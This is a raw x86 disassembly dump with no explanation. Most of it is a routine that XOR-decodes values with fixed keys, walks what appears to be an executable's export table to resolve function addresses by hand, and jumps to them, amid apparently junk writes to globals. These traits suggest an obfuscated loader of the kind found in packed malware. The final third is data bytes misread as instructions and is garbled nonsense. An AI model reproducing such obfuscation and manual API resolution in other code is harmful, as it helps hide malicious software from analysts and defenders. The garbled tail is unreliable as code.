  421b04:	xor    eax,0xca79a575
  421b09:	xor    edx,0x9c1b89e8
  421b0f:	mov    cl,0x3e
  421b11:	call   0x42223a
  421b16:	or     esi,eax
  421b18:	or     edi,edx
  421b1a:	mov    DWORD PTR [ebp-0x1f8],esi
  421b20:	jmp    0x421b75
  421b25:	mov    eax,DWORD PTR [ebp-0x1e0]
  421b2b:	mov    edx,DWORD PTR [ebp-0x1dc]
  421b31:	xor    eax,0xca79a575
  421b36:	xor    edx,0x9c1b89e8
  421b3c:	mov    cl,0x2
  421b3e:	call   0x40a9b5
  421b43:	mov    esi,eax
  421b45:	mov    edi,edx
  421b47:	mov    eax,DWORD PTR [ebp-0x1e0]
  421b4d:	mov    edx,DWORD PTR [ebp-0x1dc]
  421b53:	xor    eax,0xca79a575
  421b58:	xor    edx,0x9c1b89e8
  421b5e:	mov    cl,0x3e
  421b60:	call   0x42223a
  421b65:	or     esi,eax
  421b67:	or     edi,edx
  421b69:	add    esi,DWORD PTR [ebp-0x1f8]
  421b6f:	mov    DWORD PTR [ebp-0x1f8],esi
  421b75:	mov    eax,DWORD PTR [ebp-0x1e8]
  421b7b:	cmp    DWORD PTR [ebp-0x1f8],eax
  421b81:	je     0x421c14
  421b87:	mov    eax,DWORD PTR [ebp-0x1f8]
  421b8d:	mov    ecx,DWORD PTR [ebp-0x20c]
  421b93:	movzx  eax,WORD PTR [ecx+eax*4+0x2]
  421b98:	xor    eax,0xa49b
  421b9d:	movzx  eax,ax
  421ba0:	sar    eax,1
  421ba2:	mov    ecx,DWORD PTR [ebp-0x1f8]
  421ba8:	mov    edx,DWORD PTR [ebp-0x20c]
  421bae:	movzx  ecx,WORD PTR [edx+ecx*4+0x2]
  421bb3:	xor    ecx,0xa49b
  421bb9:	movzx  ecx,cx
  421bbc:	shl    ecx,0xf
  421bbf:	or     eax,ecx
  421bc1:	movzx  eax,ax
  421bc4:	mov    DWORD PTR [ebp-0x1fc],eax
  421bca:	mov    eax,DWORD PTR [ebp-0x1f8]
  421bd0:	mov    ecx,DWORD PTR [ebp-0x20c]
  421bd6:	movzx  eax,WORD PTR [ecx+eax*4]
  421bda:	xor    eax,0xa49b
  421bdf:	movzx  eax,ax
  421be2:	sar    eax,1
  421be4:	mov    ecx,DWORD PTR [ebp-0x1f8]
  421bea:	mov    edx,DWORD PTR [ebp-0x20c]
  421bf0:	movzx  ecx,WORD PTR [edx+ecx*4]
  421bf4:	xor    ecx,0xa49b
  421bfa:	movzx  ecx,cx
  421bfd:	shl    ecx,0xf
  421c00:	or     eax,ecx
  421c02:	mov    ecx,DWORD PTR [ebp-0x1fc]
  421c08:	mov    BYTE PTR [ebp+ecx*1-0x198],al
  421c0f:	jmp    0x421b25
  421c14:	mov    eax,DWORD PTR [ebp-0x1f0]
  421c1a:	mov    edx,DWORD PTR [ebp-0x1ec]
  421c20:	xor    eax,0xca79a575
  421c25:	xor    edx,0x9c1b89e8
  421c2b:	mov    cl,0x2
  421c2d:	call   0x40a9b5
  421c32:	mov    esi,eax
  421c34:	mov    edi,edx
  421c36:	mov    eax,DWORD PTR [ebp-0x1f0]
  421c3c:	mov    edx,DWORD PTR [ebp-0x1ec]
  421c42:	xor    eax,0xca79a575
  421c47:	xor    edx,0x9c1b89e8
  421c4d:	mov    cl,0x3e
  421c4f:	call   0x42223a
  421c54:	or     esi,eax
  421c56:	or     edi,edx
  421c58:	mov    DWORD PTR [ebp-0x1e4],esi
  421c5e:	mov    eax,DWORD PTR [ebp-0x1e0]
  421c64:	mov    edx,DWORD PTR [ebp-0x1dc]
  421c6a:	xor    eax,0xca79a575
  421c6f:	xor    edx,0x9c1b89e8
  421c75:	mov    cl,0x2
  421c77:	call   0x40a9b5
  421c7c:	mov    esi,eax
  421c7e:	mov    edi,edx
  421c80:	mov    eax,DWORD PTR [ebp-0x1e0]
  421c86:	mov    edx,DWORD PTR [ebp-0x1dc]
  421c8c:	xor    eax,0xca79a575
  421c91:	xor    edx,0x9c1b89e8
  421c97:	mov    cl,0x3e
  421c99:	call   0x42223a
  421c9e:	or     esi,eax
  421ca0:	or     edi,edx
  421ca2:	mov    DWORD PTR [ebp-0x23c],esi
  421ca8:	mov    DWORD PTR [ebp-0x238],edi
  421cae:	mov    eax,DWORD PTR [ebp-0x23c]
  421cb4:	or     eax,DWORD PTR [ebp-0x238]
  421cba:	je     0x421f1a
  421cc0:	lea    eax,[ebp-0x204]
  421cc6:	mov    DWORD PTR [ebp-0x208],eax
  421ccc:	mov    eax,DWORD PTR [ebp-0x1e4]
  421cd2:	xor    edx,edx
  421cd4:	mov    cl,0x2
  421cd6:	call   0x42223a
  421cdb:	mov    esi,eax
  421cdd:	mov    edi,edx
  421cdf:	mov    eax,DWORD PTR [ebp-0x1e4]
  421ce5:	xor    edx,edx
  421ce7:	mov    cl,0x3e
  421ce9:	call   0x40a9b5
  421cee:	or     esi,eax
  421cf0:	or     edi,edx
  421cf2:	xor    esi,0xca79a575
  421cf8:	xor    edi,0x9c1b89e8
  421cfe:	mov    eax,DWORD PTR [ebp-0x208]
  421d04:	mov    DWORD PTR [eax],esi
  421d06:	mov    DWORD PTR [eax+0x4],edi
  421d09:	mov    eax,DWORD PTR [ebp-0x1e4]
  421d0f:	movsx  esi,BYTE PTR [ebp+eax*1-0x198]
  421d17:	mov    eax,DWORD PTR [ebp-0x1e0]
  421d1d:	mov    edx,DWORD PTR [ebp-0x1dc]
  421d23:	xor    eax,0xca79a575
  421d28:	xor    edx,0x9c1b89e8
  421d2e:	mov    cl,0x2
  421d30:	call   0x40a9b5
  421d35:	mov    ebx,eax
  421d37:	mov    edi,edx
  421d39:	mov    eax,DWORD PTR [ebp-0x1e0]
  421d3f:	mov    edx,DWORD PTR [ebp-0x1dc]
  421d45:	xor    eax,0xca79a575
  421d4a:	xor    edx,0x9c1b89e8
  421d50:	mov    cl,0x3e
  421d52:	call   0x42223a
  421d57:	or     ebx,eax
  421d59:	or     edi,edx
  421d5b:	movsx  eax,bl
  421d5e:	cmp    esi,eax
  421d60:	je     0x421ec0
  421d66:	mov    eax,DWORD PTR [ebp-0x1e4]
  421d6c:	movsx  esi,BYTE PTR [ebp+eax*1-0x198]
  421d74:	mov    eax,DWORD PTR [ebp-0x204]
  421d7a:	mov    edx,DWORD PTR [ebp-0x200]
  421d80:	xor    eax,0xca79a575
  421d85:	xor    edx,0x9c1b89e8
  421d8b:	mov    cl,0x2
  421d8d:	call   0x40a9b5
  421d92:	mov    edi,eax
  421d94:	mov    ebx,edx
  421d96:	mov    eax,DWORD PTR [ebp-0x204]
  421d9c:	mov    edx,DWORD PTR [ebp-0x200]
  421da2:	xor    eax,0xca79a575
  421da7:	xor    edx,0x9c1b89e8
  421dad:	mov    cl,0x3e
  421daf:	call   0x42223a
  421db4:	or     edi,eax
  421db6:	or     ebx,edx
  421db8:	mov    eax,DWORD PTR [ebp-0x210]
  421dbe:	movsx  eax,BYTE PTR [eax+edi*1]
  421dc2:	cmp    esi,eax
  421dc4:	je     0x421dd4
  421dca:	jmp    0x421f1a
  421dcf:	jmp    0x421ec0
  421dd4:	mov    eax,DWORD PTR [ebp-0x204]
  421dda:	mov    edx,DWORD PTR [ebp-0x200]
  421de0:	xor    eax,0xca79a575
  421de5:	xor    edx,0x9c1b89e8
  421deb:	mov    cl,0x2
  421ded:	call   0x40a9b5
  421df2:	mov    esi,eax
  421df4:	mov    edi,edx
  421df6:	mov    eax,DWORD PTR [ebp-0x204]
  421dfc:	mov    edx,DWORD PTR [ebp-0x200]
  421e02:	xor    eax,0xca79a575
  421e07:	xor    edx,0x9c1b89e8
  421e0d:	mov    cl,0x3e
  421e0f:	call   0x42223a
  421e14:	or     esi,eax
  421e16:	or     edi,edx
  421e18:	mov    eax,DWORD PTR [ebp-0x210]
  421e1e:	movsx  esi,BYTE PTR [eax+esi*1]
  421e22:	mov    eax,DWORD PTR [ebp-0x1f0]
  421e28:	mov    edx,DWORD PTR [ebp-0x1ec]
  421e2e:	xor    eax,0xca79a575
  421e33:	xor    edx,0x9c1b89e8
  421e39:	mov    cl,0x2
  421e3b:	call   0x40a9b5
  421e40:	mov    ebx,eax
  421e42:	mov    edi,edx
  421e44:	mov    eax,DWORD PTR [ebp-0x1f0]
  421e4a:	mov    edx,DWORD PTR [ebp-0x1ec]
  421e50:	xor    eax,0xca79a575
  421e55:	xor    edx,0x9c1b89e8
  421e5b:	mov    cl,0x3e
  421e5d:	call   0x42223a
  421e62:	or     ebx,eax
  421e64:	or     edi,edx
  421e66:	movsx  eax,bl
  421e69:	cmp    esi,eax
  421e6b:	jne    0x421ec0
  421e71:	mov    eax,DWORD PTR [ebp-0x1e0]
  421e77:	mov    edx,DWORD PTR [ebp-0x1dc]
  421e7d:	xor    eax,0xca79a575
  421e82:	xor    edx,0x9c1b89e8
  421e88:	mov    cl,0x2
  421e8a:	call   0x40a9b5
  421e8f:	mov    esi,eax
  421e91:	mov    edi,edx
  421e93:	mov    eax,DWORD PTR [ebp-0x1e0]
  421e99:	mov    edx,DWORD PTR [ebp-0x1dc]
  421e9f:	xor    eax,0xca79a575
  421ea4:	xor    edx,0x9c1b89e8
  421eaa:	mov    cl,0x3e
  421eac:	call   0x42223a
  421eb1:	or     esi,eax
  421eb3:	or     edi,edx
  421eb5:	mov    DWORD PTR [ebp-0x214],esi
  421ebb:	jmp    0x421f64
  421ec0:	mov    eax,DWORD PTR [ebp-0x1e0]
  421ec6:	mov    edx,DWORD PTR [ebp-0x1dc]
  421ecc:	xor    eax,0xca79a575
  421ed1:	xor    edx,0x9c1b89e8
  421ed7:	mov    cl,0x2
  421ed9:	call   0x40a9b5
  421ede:	mov    esi,eax
  421ee0:	mov    edi,edx
  421ee2:	mov    eax,DWORD PTR [ebp-0x1e0]
  421ee8:	mov    edx,DWORD PTR [ebp-0x1dc]
  421eee:	xor    eax,0xca79a575
  421ef3:	xor    edx,0x9c1b89e8
  421ef9:	mov    cl,0x3e
  421efb:	call   0x42223a
  421f00:	or     esi,eax
  421f02:	or     edi,edx
  421f04:	add    esi,DWORD PTR [ebp-0x1e4]
  421f0a:	mov    DWORD PTR [ebp-0x1e4],esi
  421f10:	jmp    0x421c5e
  421f15:	jmp    0x421c5e
  421f1a:	mov    eax,DWORD PTR [ebp-0x1f0]
  421f20:	mov    edx,DWORD PTR [ebp-0x1ec]
  421f26:	xor    eax,0xca79a575
  421f2b:	xor    edx,0x9c1b89e8
  421f31:	mov    cl,0x2
  421f33:	call   0x40a9b5
  421f38:	mov    esi,eax
  421f3a:	mov    edi,edx
  421f3c:	mov    eax,DWORD PTR [ebp-0x1f0]
  421f42:	mov    edx,DWORD PTR [ebp-0x1ec]
  421f48:	xor    eax,0xca79a575
  421f4d:	xor    edx,0x9c1b89e8
  421f53:	mov    cl,0x3e
  421f55:	call   0x42223a
  421f5a:	or     esi,eax
  421f5c:	or     edi,edx
  421f5e:	mov    DWORD PTR [ebp-0x214],esi
  421f64:	mov    eax,DWORD PTR [ebp-0x214]
  421f6a:	mov    DWORD PTR [ebp-0xc8],eax
  421f70:	cmp    DWORD PTR [ebp-0xc8],0x0
  421f77:	je     0x421fa1
  421f7d:	mov    eax,DWORD PTR [ebp-0x144]
  421f83:	mov    ecx,DWORD PTR [ebp-0xac]
  421f89:	movzx  eax,WORD PTR [ecx+eax*2]
  421f8d:	mov    ecx,DWORD PTR [ebp-0xa8]
  421f93:	mov    eax,DWORD PTR [ecx+eax*4]
  421f96:	mov    DWORD PTR [ebp-0xfc],eax
  421f9c:	jmp    0x421fa6
  421fa1:	jmp    0x4219d1
  421fa6:	cmp    DWORD PTR [ebp-0xfc],0x0
  421fad:	jne    0x421fba
  421fb3:	xor    eax,eax
  421fb5:	jmp    0x422233
  421fba:	mov    eax,DWORD PTR [ebp+0x8]
  421fbd:	add    eax,DWORD PTR [ebp-0xfc]
  421fc3:	mov    DWORD PTR [ebp-0xec],eax
  421fc9:	mov    DWORD PTR [ebp-0x74],0x0
  421fd0:	cmp    DWORD PTR [ebp-0xb0],0x0
  421fd7:	je     0x422053
  421fdd:	cmp    DWORD PTR [ebp-0xb0],0x0
  421fe4:	je     0x422053
  421fea:	mov    eax,DWORD PTR [ebp-0xb0]
  421ff0:	shl    eax,0x2
  421ff3:	mov    DWORD PTR [ebp-0x74],eax
  421ff6:	mov    DWORD PTR [ebp-0x14c],0x0
  422000:	sub    esp,DWORD PTR [ebp-0x74]
  422003:	mov    DWORD PTR [ebp-0x14c],esp
  422009:	mov    DWORD PTR [ebp-0x148],0x0
  422013:	mov    eax,DWORD PTR [ebp-0x148]
  422019:	cmp    eax,DWORD PTR [ebp-0xb0]
  42201f:	je     0x422053
  422025:	mov    eax,DWORD PTR [ebp-0x148]
  42202b:	mov    ecx,DWORD PTR [ebp-0x14c]
  422031:	mov    edx,DWORD PTR [ebp-0x148]
  422037:	mov    esi,DWORD PTR [ebp+0x14]
  42203a:	mov    edx,DWORD PTR [esi+edx*4+0x4]
  42203e:	mov    DWORD PTR [ecx+eax*4],edx
  422041:	mov    eax,DWORD PTR [ebp-0x148]
  422047:	inc    eax
  422048:	mov    DWORD PTR [ebp-0x148],eax
  42204e:	jmp    0x422013
  422053:	mov    DWORD PTR [ebp-0x9c],0x0
  42205d:	push   0x4221ec
  422062:	jmp    DWORD PTR [ebp-0xec]
  422068:	mov    eax,eax
  42206a:	mov    ecx,esp
  42206c:	ret    0xc
  42206f:	cmp    DWORD PTR ds:0x4282ff,0x0
  422076:	mov    DWORD PTR ds:0x4282fb,0x7476
  422080:	mov    DWORD PTR ds:0x428177,0x1cdc
  42208a:	mov    DWORD PTR ds:0x4282fb,0x65fa
  422094:	mov    DWORD PTR ds:0x428167,0x5dca
  42209e:	jmp    0x4220e8
  4220a3:	mov    eax,ds:0x4282f7
  4220a8:	cmp    DWORD PTR ds:0x4282ff,0x0
  4220af:	jbe    0x4220d0
  4220b5:	push   0x24f1
  4220ba:	call   DWORD PTR ds:0x428d78
  4220c0:	inc    DWORD PTR ds:0x4283a3
  4220c6:	sub    DWORD PTR ds:0x428183,0x46d9
  4220d0:	inc    DWORD PTR ds:0x4282ff
  4220d6:	adc    DWORD PTR ds:0x42830b,ebx
  4220dc:	or     DWORD PTR ds:0x428233,0x4029
  4220e6:	not    eax
  4220e8:	push   ebx
  4220e9:	push   esi
  4220ea:	sbb    DWORD PTR ds:0x42838f,edx
  4220f0:	mov    eax,DWORD PTR [esp+0x18]
  4220f4:	or     eax,eax
  4220f6:	jne    0x422126
  4220fc:	mov    ecx,DWORD PTR [esp+0x14]
  422100:	mov    eax,DWORD PTR [esp+0x10]
  422104:	xor    edx,edx
  422106:	div    ecx
  422108:	xor    DWORD PTR ds:0x42818f,0x45f1
  422112:	mov    ebx,eax
  422114:	mov    eax,DWORD PTR [esp+0xc]
  422118:	div    ecx
  42211a:	mov    edx,0x36e3
  42211f:	mov    edx,ebx
  422121:	jmp    0x4221e7
  422126:	mov    ecx,eax
  422128:	sbb    eax,0x67a9
  42212d:	mov    ebx,DWORD PTR [esp+0x14]
  422131:	cmp    DWORD PTR ds:0x4282f7,0x0
  422138:	mov    edx,DWORD PTR ds:0x4283a7
  42213e:	mov    DWORD PTR ds:0x428327,0x4bc7
  422148:	mov    edx,DWORD PTR ds:0x42830f
  42214e:	jmp    0x422198
  422153:	mov    DWORD PTR ds:0x428257,0x15f
  42215d:	mov    DWORD PTR ds:0x42828f,0x4dd1
  422167:	cmp    DWORD PTR ds:0x4282f7,0x0
  42216e:	jle    0x42218b
  422174:	push   0x824e
  422179:	call   DWORD PTR ds:0x428d7c
  42217f:	xor    DWORD PTR ds:0x42830f,0x6c44
  422189:	sub    edx,edx
  42218b:	sbb    DWORD PTR ds:0x428257,0x445e
  422195:	dec    edx
  422196:	not    edx
  422198:	mov    edx,DWORD PTR [esp+0x10]
  42219c:	mov    eax,DWORD PTR [esp+0xc]
  4221a0:	shr    ecx,1
  4221a2:	rcr    ebx,1
  4221a4:	shr    edx,1
  4221a6:	rcr    eax,1
  4221a8:	or     ecx,ecx
  4221aa:	jne    0x4221a0
  4221b0:	div    ebx
  4221b2:	mov    esi,eax
  4221b4:	mul    DWORD PTR [esp+0x18]
  4221b8:	mov    ecx,eax
  4221ba:	mov    eax,DWORD PTR [esp+0x14]
  4221be:	mul    esi
  4221c0:	add    edx,ecx
  4221c2:	jb     0x4221e2
  4221c8:	cmp    edx,DWORD PTR [esp+0x10]
  4221cc:	ja     0x4221e2
  4221d2:	jb     0x4221e3
  4221d8:	cmp    eax,DWORD PTR [esp+0xc]
  4221dc:	jbe    0x4221e3
  4221e2:	dec    esi
  4221e3:	xor    edx,edx
  4221e5:	mov    eax,esi
  4221e7:	pop    esi
  4221e8:	pop    ebx
  4221e9:	ret    0x10
  4221ec:	or     DWORD PTR ds:0x428373,0x42837f
  4221f6:	sub    DWORD PTR [ebp+0x10],0x1
  4221fa:	mov    DWORD PTR ds:0x42817b,0x43bf
  422204:	cmp    DWORD PTR [ebp+0x10],0x0
  422208:	mov    DWORD PTR ds:0x42836b,0x612a
  422212:	je     0x422221
  422218:	xor    DWORD PTR ds:0x428167,edx
  42221e:	add    esp,DWORD PTR [ebp-0x74]
  422221:	mov    DWORD PTR [ebp-0x9c],eax
  422227:	mov    DWORD PTR ds:0x42826f,ebx
  42222d:	mov    eax,DWORD PTR [ebp-0x9c]
  422233:	pop    edi
  422234:	pop    esi
  422235:	pop    ebx
  422236:	leave  
  422237:	ret    0x10
  42223a:	cmp    cl,0x40
  42223d:	mov    DWORD PTR ds:0x428253,0x43a8
  422247:	jae    0x422299
  42224d:	mov    DWORD PTR ds:0x428187,0x42f2
  422257:	cmp    cl,0x20
  42225a:	mov    DWORD PTR ds:0x42816f,0x3d58
  422264:	jae    0x422284
  42226a:	or     DWORD PTR ds:0x428163,0x5e1e
  422274:	shld   edx,eax,cl
  422277:	mov    DWORD PTR ds:0x428287,0x1bd2
  422281:	shl    eax,cl
  422283:	ret    
  422284:	inc    edx
  422285:	mov    edx,eax
  422287:	sub    DWORD PTR ds:0x4283a3,0x4282fb
  422291:	xor    eax,eax
  422293:	and    cl,0x1f
  422296:	shl    edx,cl
  422298:	ret    
  422299:	xor    eax,eax
  42229b:	xor    edx,edx
  42229d:	ret    
  42229e:	add    BYTE PTR [eax],al
  4222a0:	jmp    0x3c568de0
  4222a5:	es sub al,0x44
  4222a8:	jno    0x422313
  4222aa:	ja     0x422311
  4222ac:	int3   
  4222ad:	fsubr  QWORD PTR [edx+0x1e]
  4222b0:	jo     0x422317
  4222b2:	popa   
  4222b3:	ins    BYTE PTR es:[edi],dx
  4222b4:	push   eax
  4222b5:	lods   eax,DWORD PTR ds:[esi]
  4222b6:	xor    DWORD PTR [esi+0x41],edi
  4222b9:	ins    BYTE PTR es:[edi],dx
  4222ba:	popa   
  4222bb:	outs   dx,BYTE PTR ds:[esi]
  4222bc:	add    BYTE PTR [eax],al
  4222be:	add    BYTE PTR [eax],al
  4222c0:	addr16 jb 0x422328
  4222c3:	popa   
  4222c4:	je     0x42232d
  4222c6:	jb     0x42232d
  4222c8:	popa   
  4222c9:	je     0x422332
  4222cb:	jb     0x422332
  4222cd:	popa   
  4222ce:	je     0x422337
  4222d0:	jb     0x422337
  4222d2:	popa   
  4222d3:	je     0x42233c
  4222d5:	jb     0x42233c
  4222d7:	popa   
  4222d8:	je     0x422341
  4222da:	jb     0x422341
  4222dc:	popa   
  4222dd:	je     0x422346
  4222df:	jb     0x422346
  4222e1:	popa   
  4222e2:	je     0x42234b
  4222e4:	jb     0x42234b
  4222e6:	popa   
  4222e7:	je     0x422350
  4222e9:	jb     0x422350
  4222eb:	popa   
  4222ec:	je     0x422355
  4222ee:	jb     0x422355
  4222f0:	popa   
  4222f1:	je     0x4222f3
  4222f3:	add    BYTE PTR [eax+0x65],ch
  4222f6:	ins    BYTE PTR es:[edi],dx
  4222f7:	ins    BYTE PTR es:[edi],dx
  4222f8:	push   0x686c6c65
  4222fd:	gs ins BYTE PTR es:[edi],dx
  4222ff:	ins    BYTE PTR es:[edi],dx
  422300:	push   0x686c6c65
  422305:	gs ins BYTE PTR es:[edi],dx
  422307:	ins    BYTE PTR es:[edi],dx
  422308:	push   0x686c6c65
  42230d:	gs ins BYTE PTR es:[edi],dx
  42230f:	ins    BYTE PTR es:[edi],dx
  422310:	push   0x686c6c65
  422315:	gs ins BYTE PTR es:[edi],dx
  422317:	ins    BYTE PTR es:[edi],dx
  422318:	push   0x686c6c65
  42231d:	gs ins BYTE PTR es:[edi],dx
  42231f:	ins    BYTE PTR es:[edi],dx
  422320:	push   0x686c6c65
  422325:	gs ins BYTE PTR es:[edi],dx
  422327:	ins    BYTE PTR es:[edi],dx
  422328:	add    BYTE PTR [eax],al
  42232a:	add    BYTE PTR [eax],al
  42232c:	outs   dx,DWORD PTR ds:[esi]
  42232d:	add    BYTE PTR [eax+eax*1+0x65],ch
  422331:	add    BYTE PTR [ecx+0x0],ah
  422334:	jne    0x422336
  422336:	je     0x422338
  422338:	xor    eax,DWORD PTR [eax]
  42233a:	xor    al,BYTE PTR [eax]
  42233c:	add    BYTE PTR [eax],al
  42233e:	add    BYTE PTR [eax],al
  422340:	push   0x61006500
  422345:	add    BYTE PTR [esi+0x0],dh
  422348:	add    BYTE PTR gs:[esi+0x0],ch
  42234c:	push   0x61006500
  422351:	add    BYTE PTR [esi+0x0],dh
  422354:	add    BYTE PTR gs:[esi+0x0],ch
  422358:	push   0x61006500
  42235d:	add    BYTE PTR [esi+0x0],dh
  422360:	add    BYTE PTR gs:[esi+0x0],ch
  422364:	push   0x61006500
  422369:	add    BYTE PTR [esi+0x0],dh
  42236c:	add    BYTE PTR gs:[esi+0x0],ch
  422370:	push   0x61006500
  422375:	add    BYTE PTR [esi+0x0],dh
  422378:	add    BYTE PTR gs:[esi+0x0],ch
  42237c:	push   0x61006500
  422381:	add    BYTE PTR [esi+0x0],dh
  422384:	add    BYTE PTR gs:[esi+0x0],ch
  422388:	push   0x61006500
  42238d:	add    BYTE PTR [esi+0x0],dh
  422390:	add    BYTE PTR gs:[esi+0x0],ch
  422394:	push   0x61006500
  422399:	add    BYTE PTR [esi+0x0],dh
  42239c:	add    BYTE PTR gs:[esi+0x0],ch
  4223a0:	push   0x61006500
  4223a5:	add    BYTE PTR [esi+0x0],dh
  4223a8:	add    BYTE PTR gs:[esi+0x0],ch
  4223ac:	add    BYTE PTR [eax],al
  4223ae:	add    BYTE PTR [eax],al
  4223b0:	sub    al,0x23
  4223b2:	inc    edx
  4223b3:	add    BYTE PTR [edi+0x6c],cl
  4223b6:	gs dec ecx
  4223b8:	arpl   WORD PTR [edi+0x6e],bp
  4223bb:	push   esp
  4223bc:	outs   dx,DWORD PTR ds:[esi]
  4223bd:	inc    ebx
  4223be:	jne    0x422432
  4223c0:	jae    0x422431
  4223c2:	jb     0x4223c4
  4223c4:	mov    ah,0x23
  4223c6:	inc    edx
	...
  4223cf:	add    BYTE PTR [eax+0x27],dh
  4223d2:	inc    edx
  4223d3:	add    BYTE PTR [eax+0x27],bh
  4223d6:	inc    edx
  4223d7:	add    BYTE PTR [eax],dh
  4223d9:	es inc edx
  4223db:	add    dl,dh
  4223dd:	inc    ebx
  4223de:	push   ebx
  4223df:	mov    WORD PTR ds:0x1a49ba4,ss
  4223e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223e6:	popf   
  4223e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223e8:	jno    0x42238e
  4223ea:	xchg   edi,eax
  4223eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223ec:	or     esp,DWORD PTR [ecx+ecx*4-0x7c5bac5c]
  4223f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223f4:	sbb    DWORD PTR [ebp+eax*4-0x445b645c],esp
  4223fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223fc:	rol    DWORD PTR [edx-0x5b6a732f],cl
  422402:	adc    eax,0x1a49ba4
  422407:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422408:	popf   
  422409:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42240a:	jno    0x4223b0
  42240c:	xchg   edi,eax
  42240d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42240e:	or     esp,DWORD PTR [ecx+ecx*4-0x7c5bac5c]
  422415:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422416:	xor    eax,0x9ba485a4
  42241b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42241c:	mov    ebx,0xd1e2d3a4
  422421:	in     al,dx
  422422:	xchg   ebp,eax
  422423:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422424:	adc    eax,0x3ba49ba4
  422429:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42242a:	popf   
  42242b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42242c:	sbb    DWORD PTR [ebp+edx*4-0x705b805c],esp
  422433:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422434:	fwait
  422435:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422436:	xchg   DWORD PTR [ebx+edx*8-0xe332e3e],esp
  42243d:	sub    al,0xf7
  42243f:	cs pop ss
  422441:	push   cs
  422442:	adc    eax,0x3a49108
  422447:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422448:	fwait
  422449:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42244a:	add    esp,DWORD PTR [ebx+edx*4-0x6a5b805c]
  422451:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422452:	sbb    DWORD PTR [ebp+ecx*4-0x7c5b645c],esp
  422459:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42245a:	shl    DWORD PTR [edx],cl
  42245c:	shr    DWORD PTR [ecx+esi*8],1
  42245f:	or     al,0xf7
  422461:	push   cs
  422462:	pop    ss
  422463:	outs   dx,BYTE PTR ds:[esi]
  422464:	adc    eax,0x3a49168
  422469:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42246a:	fwait
  42246b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42246c:	add    esp,DWORD PTR [ebx+edx*4-0x6a5b805c]
  422473:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422474:	xor    eax,0x9ba48da4
  422479:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42247a:	and    DWORD PTR [ebx+edx*8-0xef32efe],0x6c
  422482:	imul   DWORD PTR [esi+0x17]
  422485:	dec    esi
  422486:	adc    eax,0x37a49148
  42248b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42248c:	fwait
  42248d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42248e:	jae    0x422434
  422490:	popf   
  422491:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422492:	sbb    DWORD PTR [ebp+edx*4-0x705bba5c],esp
  422499:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42249a:	fwait
  42249b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42249c:	and    DWORD PTR [ebx+edx*8-0xe932e9e],0x4c
  4224a4:	test   DWORD PTR [esi+0x16],0x91a814ae
  4224ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224ac:	aaa    
  4224ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224ae:	fwait
  4224af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224b0:	jae    0x422456
  4224b2:	popf   
  4224b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224b4:	pop    ss
  4224b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224b6:	xchg   ebp,eax
  4224b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224b8:	push   ecx
  4224b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224ba:	mov    DWORD PTR [ebx+ebx*4-0x2c5b725c],esp
  4224c1:	inc    edx
  4224c2:	ror    DWORD PTR [eax+esi*8-0x54],1
  4224c6:	imul   BYTE PTR [esi-0x77eb71ea]
  4224cc:	xchg   ecx,eax
  4224cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224ce:	aaa    
  4224cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224d0:	fwait
  4224d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224d2:	jae    0x422478
  4224d4:	popf   
  4224d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224d6:	cmp    esp,DWORD PTR [ebp+edx*4-0x705b8c5c]
  4224dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224de:	fwait
  4224df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224e0:	xchg   DWORD PTR [edx+edx*8-0xf532f5e],esp
  4224e7:	mov    esi,?
  4224e9:	mov    ss,WORD PTR [esi]
  4224eb:	out    dx,al
  4224ec:	adc    al,0xe8
  4224ee:	xchg   ecx,eax
  4224ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224f0:	aaa    
  4224f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224f2:	fwait
  4224f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224f4:	jae    0x42249a
  4224f6:	popf   
  4224f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224f8:	cmp    DWORD PTR [ebp+edx*4-0x705b805c],esp
